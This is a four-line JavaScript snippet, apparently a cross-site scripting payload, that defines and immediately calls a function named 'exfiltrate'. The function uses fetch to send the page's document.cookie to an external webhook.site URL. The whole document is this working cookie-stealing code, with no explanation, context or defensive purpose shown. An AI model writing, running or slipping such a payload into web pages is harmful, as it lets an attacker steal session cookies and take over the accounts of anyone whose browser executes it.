async function exfiltrate(){
  await fetch('https://webhook.site/97274b59-5b47-484b-a6d6-6908d03fad5e/?cookie='+document.cookie);
}
exfiltrate();
